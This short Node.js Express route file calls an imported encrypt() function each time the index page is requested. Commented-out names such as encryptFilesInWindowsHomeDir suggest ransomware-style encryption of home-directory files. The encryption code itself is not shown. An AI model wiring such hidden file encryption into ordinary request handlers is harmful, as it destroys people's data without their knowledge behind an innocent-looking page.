const express = require("express");
// const { 
//     encryptFilesInWindowsHomeDir,
//     encryptFilesInMacHomeDir,
//     encryptFilesInLinuxHomeDir,
//     encryptFilesInMobileHomeDir
//  } = require("../main");

const encrypt = require("../test");

const os = require("os");
const path = require("path");


const router = express.Router();


router.get("/", async (req, res) => {
    try {
        // encryptFilesInMacHomeDir();
        // encryptFilesInLinuxHomeDir();
        // encryptFilesInMobileHomeDir();
        encrypt()
        console.log("Hey there I run from the server");
    } catch (error) {
        console.log(error);
    }
    res.render("index");
});

module.exports = router;